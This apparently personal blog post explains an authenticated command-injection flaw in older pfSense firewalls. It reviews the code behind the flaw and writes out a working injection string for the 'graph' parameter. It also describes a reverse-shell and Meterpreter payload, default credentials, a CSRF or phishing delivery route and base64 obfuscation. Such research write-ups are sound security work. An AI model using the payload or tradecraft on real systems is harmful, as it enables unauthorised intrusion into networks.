---
layout: post
title:  "pfSense Authenticated Arbitrary Code Execution Exploit"
subtitle: "PoCs"
date:   2018-01-14 00:00:00 -0500
author: "coastal"
header-img: "images/site-resources/pfsense-code-exec-header.jpg"
---

### introduction

Recently, I came across a code execution vulnerability that affected pfSense firewalls running the community edition software version 2.2.6 or earlier. When I was working on exploiting the firewall, I found a [post](https://www.security-assessment.com/files/documents/advisory/pfsenseAdvisory.pdf) from 2016 from Security Assessment detailing how an authenticated user can perform arbitrary remote code execution through exploiting the `graph` **GET** parameter of the `status_rrd_graph_img.php` page. I found out that a PR had just been made in the last week to [the metasploit-framework](https://github.com/rapid7/metasploit-framework/pull/9362) to integrate this exploit. However, with a personal goal set to develop my own exploits and not use metasploit, I decided that I had to make a PoC exploit in `python3`.

### code review

The vulnerability stems from a lack of proper parameter filtering. If we look at the code in a [vulnerable version](https://github.com/pfsense/pfsense/blob/57627d9f3152f6ea984d3cdff71fa6e888784701/usr/local/www/status_rrd_graph_img.php) of `status_rrd_graph_img.php` starting on line 58, we can see the specific filtering rules that cause the vulnerability:

```
/* this is used for temp name */
if ($_GET['graph']) {
	$curgraph = str_replace(array("<", ">", ";", "&", "'", '"'), "", htmlspecialchars_decode($_GET['graph'], ENT_QUOTES | ENT_HTML401));
} else {
	$curgraph = "custom";
}
```

The blacklist misses the `|` character. We can see how this results in command execution by seeing what happens when we specify that we would like to use the `-throughput.rrd` database, starting on line 480:

```
elseif(strstr($curdatabase, "-throughput.rrd")) {
	/* define graphcmd for throughput stats */
	/* this gathers all interface statistics, the database does not actually exist */
	$graphcmd = "$rrdtool graph $rrdtmppath$curdatabase-$curgraph.png ";
	$graphcmd .= "--start $start --end $end --step $step ";
	$graphcmd .= "--vertical-label \"bits/sec\" ";
	$graphcmd .= "--color SHADEA#eeeeee --color SHADEB#eeeeee ";
	$graphcmd .= "--title \"" . php_uname('n') . " - {$prettydb} - {$hperiod} - {$havg} average\" ";
	$graphcmd .= "--height 200 --width 620 ";
```

An example of an injection that would lead to arbitrary code execution could be like so:

```
?database=-throughput.rrd&graph=file|echo whoami|sh|echo
``` 

When this input is parsed, the `$graphcmd` that is executed by the system becomes

```
rrdtool graph $rrdtmppath$curdatabase-file|echo whoami|sh|echo --start ...
```

i.e.

```
rdtool graph $rrdtmppath$curdatabase-file
```

```
echo whoami|sh
```

```
echo --start $start --end $end --step $step ...[truncated]...
```

whoops

### exploitation

There are two payloads built in to the exploit: a normal `php` reverse shell, and a `meterpreter` stager.

**php reverse shell**

<img src="{{ site.baseurl }}/images/notes-tips-tricks/nc.gif">

**meterpreter stager**

<img src="{{ site.baseurl }}/images/notes-tips-tricks/msf.gif">

This exploit does require authentication, so you need to know a login to the firewall in order to perform the exploitation. The exploit is built-in with the default pfSense credentials baked in (`admin:pfsense`). If this login does not work, you will need to either determine the login credentials or integrate this exploit into a CSRF attack. CSRF protection is not built into the requests passed to `status_rrd_graph_img.php`. In the real world, that means that this arbitrary code execution could be performed by convincing an authenticated admin to click a payload link, perhaps through a phishing vector.

### base64 headaches

I had an arduous journey trying to get the `base64` payload obfuscation working. While not an inherent necessity, it is always nice to add another layer of protection to payload delivery. Unfortunately, I ran into some subtlety in how `python` and `php` process `base64` encoding and decoding.

Let's generate a test string that, when encoded with `python`'s `base64` library, requires padding.

```
>>> import base64
>>> base64.b64encode("test message here")
'dGVzdCBtZXNzYWdlIGhlcmU='
>>> base64.b64decode('dGVzdCBtZXNzYWdlIGhlcmU=')
'test message here'
```

We can see that encoding and decoding the string works as you would expect. However, when we take that padded `base64` encoded string and try to decode it with `php`'s `base64` library it doesn't go quite as smoothly.

```
coastal@blackbox  /tmp  echo '<?php print(base64_decode(dGVzdCBtZXNzYWdlIGhlcmU=)) ?>' > test.php
coastal@blackbox  /tmp  php test.php
PHP Parse error:  syntax error, unexpected '=', expecting ',' or ')' in /tmp/test.php on line 1
```

Interestingly, if we remove the padding from the `base64` encoded string that was generated in `python` and try to decode it with `php`'s library it decodes flawlessly.

```
coastal@blackbox  /tmp  echo '<?php print(base64_decode(dGVzdCBtZXNzYWdlIGhlcmU)) ?>' > test.php 
coastal@blackbox  /tmp  php test.php                                                            
PHP Notice:  Use of undefined constant dGVzdCBtZXNzYWdlIGhlcmU - assumed 'dGVzdCBtZXNzYWdlIGhlcmU' in /tmp/test.php on line 1
test message here
```

However, if we try to decode that trimmed `base64` string with `python`'s library, we get an exception

```
>>> base64.b64decode('dGVzdCBtZXNzYWdlIGhlcmU')
Traceback (most recent call last):
  File "<stdin>", line 1, in <module>
  File "/usr/lib/python2.7/base64.py", line 78, in b64decode
    raise TypeError(msg)
TypeError: Incorrect padding
```

As to the platform-specific reasons underlying these idiosyncrasies, I am not entirely sure. I can tell you that it is a fairly subtle bug to try to find, and wholly unexpected (at least for me). But, since the payload generation is in `python` and execution is in `php`, we can simply trim the padding from the generated `base64` string and wrap in in `php`'s `base64` library calls to get functional obfuscation and execution.

### summary

I hope this was an interesting post, and if you would like to check out / use my exploit PoC you can view it on my [github](https://github.com/spencerdodd/pfsense-code-exec). Thanks!

-coastal